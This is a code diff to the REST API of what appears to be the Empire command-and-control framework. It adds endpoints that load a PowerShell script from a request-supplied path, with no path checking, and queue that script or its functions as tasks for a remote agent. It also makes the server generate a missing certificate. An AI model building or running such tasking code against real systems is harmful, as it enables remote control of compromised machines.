@@ -1006,6 +1006,60 @@ def start_restful_api(empireMenu: MainMenu, suppress=False, headless=False, user
 
         return jsonify({'success': True, 'taskID': task_id})
 
+    @app.route('/api/agents/<string:agent_name>/script_import', methods=['POST'])
+    def task_agent_script_import(agent_name):
+        """
+        Imports a PowerShell script and keeps it in memory in the agent.
+
+        Takes {'script':'script_location'}
+        """
+        agent = main.agents.get_agent_from_name_or_session_id(agent_name)
+
+        if agent is None:
+            return make_response(jsonify({'error': 'agent name %s not found' % agent_name}), 404)
+
+        path = main.installPath + '/' + request.json['script']
+
+        if path != "" and os.path.exists(path):
+            open_file = open(path, 'r')
+            script_data = open_file.read()
+            open_file.close()
+
+            # strip out comments and blank lines from the imported script
+            script_data = helpers.strip_powershell_comments(script_data)
+
+            # add task command to agent taskings
+            msg = "tasked agent %s to run command %s" % (agent.session_id, script_data)
+            main.agents.save_agent_log(agent.session_id, msg)
+            task_id = main.agents.add_agent_task_db(agent.session_id, "TASK_SCRIPT_IMPORT", script_data, uid=g.user['id'])
+
+            return jsonify({'success': True, 'taskID': task_id})
+
+        else:
+            return make_response(jsonify({'error': 'Unable to find script'}))
+
+    @app.route('/api/agents/<string:agent_name>/script_command', methods=['POST'])
+    def task_agent_script_command(agent_name):
+        """
+        "Execute a function in the currently imported PowerShell script."
+
+        Takes {'script':'scipt_command'}
+        """
+        agent = main.agents.get_agent_from_name_or_session_id(agent_name)
+
+        if agent is None:
+            return make_response(jsonify({'error': 'agent name %s not found' % agent_name}), 404)
+
+        command = request.json['script']
+
+        # add task command to agent taskings
+        msg = "tasked agent %s to run command %s" % (agent.session_id, command)
+        main.agents.save_agent_log(agent.session_id, msg)
+        task_id = main.agents.add_agent_task_db(agent.session_id, "TASK_SCRIPT_COMMAND", command, uid=g.user['id'])
+
+        return jsonify({'success': True, 'taskID': task_id})
+
+
     @app.route('/api/agents/<string:agent_name>/update_comms', methods=['PUT'])
     def agent_update_comms(agent_name):
         """
@@ -1586,10 +1640,6 @@ def start_restful_api(empireMenu: MainMenu, suppress=False, headless=False, user
             return make_response(jsonify({'error': 'internal plugin error'}), 400)
         return jsonify(results)
 
-    if not os.path.exists('./empire/server/data/empire-chain.pem'):
-        print(helpers.color("[!] Error: cannot find certificate ./empire/server/data/empire-chain.pem"))
-        sys.exit()
-
     def shutdown_server():
         """
         Shut down the Flask server and any Empire instance gracefully.
@@ -1838,6 +1888,11 @@ def run(args):
         sys.exit()
 
     else:
+        if not os.path.exists('./empire/server/data/empire-chain.pem'):
+            print(helpers.color("[*] Certificate not found. Generating..."))
+            subprocess.call("./setup/cert.sh")
+            time.sleep(3)
+
         # start an Empire instance and RESTful API with the teamserver interface
         main = empire.MainMenu(args=args)
 
